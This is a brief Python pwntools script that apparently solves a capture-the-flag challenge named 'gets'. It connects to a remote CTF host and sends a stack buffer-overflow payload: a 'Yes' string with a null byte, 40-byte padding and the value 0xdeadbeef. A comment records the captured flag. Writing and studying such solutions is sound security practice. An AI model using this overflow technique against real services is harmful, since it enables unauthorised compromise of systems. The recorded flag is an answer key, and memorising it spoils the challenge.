
from pwn import *

r = remote('gets.litctf.live', 1337)

r.recv()

p = b'Yes\x00'
p += (40 - len(p)) * b'A'
p += p64(0xdeadbeef) 

print(p)
r.sendline(p)

print(r.recv())
print(r.recv())

# flag{d0_y0u_g3ts_1t}